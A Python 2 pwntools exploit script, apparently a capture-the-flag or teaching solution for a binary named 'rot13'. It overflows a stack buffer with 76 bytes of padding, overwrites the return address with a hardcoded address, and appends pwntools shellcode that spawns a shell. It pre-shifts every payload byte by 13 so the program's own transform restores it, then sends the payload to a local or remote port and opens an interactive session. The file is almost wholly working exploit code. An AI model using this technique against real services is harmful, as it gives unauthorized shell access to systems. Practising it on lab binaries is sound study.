#!/usr/bin/env python2
from pwn import *

# You might have to change this depending on the architecture of the binary
context.arch = 'i386'
#context.arch = 'amd64'

# Toggle these variables to turn debugging or remote exploitation on/off
REMOTE = True
DEBUG = False

# Update these to match your environment
FNAME = '../distFiles/rot13'
HOST = '127.0.0.1'
PORT = '1337'

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    elif DEBUG:
        p = process(['gdbserver', 'localhost:1234', FNAME])
    else:
        p = process([FNAME])
    return p

p = getp()

payload = ''
payload += 'A'*76
# p32() is used to convert an integer to a binary string of the correct endianness for your binary
# for x64 binaries, you are likely to use p64() instead.
payload += p32(0x080484e3)
# pwntools provides free shellcode for us!  This will execute a shell!
payload += asm(shellcraft.i386.linux.sh())
# And just to clean-up things, we will add some shellcode that cleanly calls exit.
# This isn't required though.
payload += asm(shellcraft.i386.linux.exit())

# subtract 13 from each byte
payload_rotted = ''
for c in payload:
    newc = ord(c)-13
    if newc < 0:
        newc = 256+newc
    payload_rotted += chr(newc)

p.sendline(payload_rotted)

p.interactive()
